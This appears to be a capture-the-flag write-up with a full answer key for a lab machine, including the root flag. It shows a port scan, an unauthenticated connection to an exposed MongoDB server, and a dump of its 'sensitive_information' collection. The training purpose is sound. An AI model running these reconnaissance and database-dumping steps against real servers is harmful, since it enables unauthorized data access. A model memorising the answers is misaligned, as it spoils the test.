# Tasks
- How many TCP ports are open on the machine?
	- 2
- Which service is running on port 27017 of the remote host?
	- MongoDB 3.6.8
- What type of database is MongoDB? (Choose: SQL or NoSQL)
	- NoSQL
- What command is used to launch the interactive MongoDB shell from the terminal?
	- mongosh
- What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)
	- show dbs
- What is the command used for listing out the collections in a database? (No need to include a trailing ;)
	- show collections
- What command is used to dump the content of all the documents within the collection named `flag`?
	- db.flag.find()
- Submit root flag
	- 1b6e6fb359e7c40241b6d431427ba6ea


# Steps
- First, let's get a rustscan run out of the way first.
```
rustscan --ulimit 5000 --addresses "10.129.17.143" --top -- -sC -sV
```
- We get some results, including the existence of a MongoDB database!
```
PORT      STATE SERVICE REASON         VERSION                                                                                                                                                                                                 
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                                 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)                                                                                                                                                                                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1  
f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZ  
rqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=                                                                                                                                                             
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)                                                                                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=                                                                             
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)                                                                                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR                                                                                                                                                             
27017/tcp open  mongodb syn-ack ttl 63 MongoDB 3.6.8 3.6.8
```
- We now need to the use the MongoDB command line tool to view the database.
- So, we need to download a specific version of Mongosh, which is 2.3.2.
```
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz

tar xvf mongosh-2.3.2-linux-x64.tgz

cd mongosh-2.3.2-linux-x64/bin
```
- We can then use mongosh to connect to the target
```
./mongosh mongodb://10.129.17.143:27017
```
- Now, let's go ahead and show the database tables
```
test> show dbs;  
admin                  32.00 KiB  
config                 72.00 KiB  
local                  72.00 KiB  
sensitive_information  32.00 KiB  
users                  32.00 KiB
```
- Sensitive information is interesting to us, so let's go there:
```
use sensitive_information;
```
- Now, we can see that this contains the flag!
```
> show collections;

flag
```
- Now, we can use the find() command to get our flag!
```
sensitive_information> db.flag.find();  
[  
 {  
   _id: ObjectId('630e3dbcb82540ebbd1748c5'),  
   flag: '1b6e6fb359e7c40241b6d431427ba6ea'  
 }  
]
```
